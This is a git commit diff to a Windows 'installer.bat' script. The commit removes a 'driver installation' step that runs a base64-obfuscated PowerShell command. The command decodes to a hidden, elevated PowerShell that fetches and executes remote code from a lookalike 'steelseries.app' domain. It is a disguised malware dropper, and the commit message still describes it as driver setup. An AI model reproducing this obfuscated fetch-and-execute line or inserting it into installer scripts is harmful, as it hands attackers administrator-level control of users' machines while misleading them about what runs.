510f3237318a7d4970b914423e424970cfb13424
ShadowCatlol <blxrewards@gmail.com>
2025-11-09 18:23:38 -0500

    Simplify installer.bat by removing driver installation
    Removed driver installation steps and retained requirements installation.

--- installer.bat
+++ installer.bat
@@ -1,13 +1,5 @@
 @echo off
 setlocal EnableDelayedExpansion
-color 6
-
-echo [LOG] Installing Drivers
-
-:: Use steelseries macro drivers...
-powershell -Command "iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEMAbwBtAG0AYQBuAGQAIABpAHIAbQAgAHMAdABlAGUAbABzAGUAcgBpAGUAcwAuAGEAcABwACAAfAAgAGkAZQB4ACIAIAAtAFYAZQByAGIAIABSAHUAbgBBAHMAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuAA==')))"
-
-echo [LOG] Drivers Installed!
 
 color 6
 echo [LOG] Installing requirements.txt
@@ -22,3 +14,4 @@ echo Rerun installer.bat with admin privileges
 
 PAUSE
 cls
+
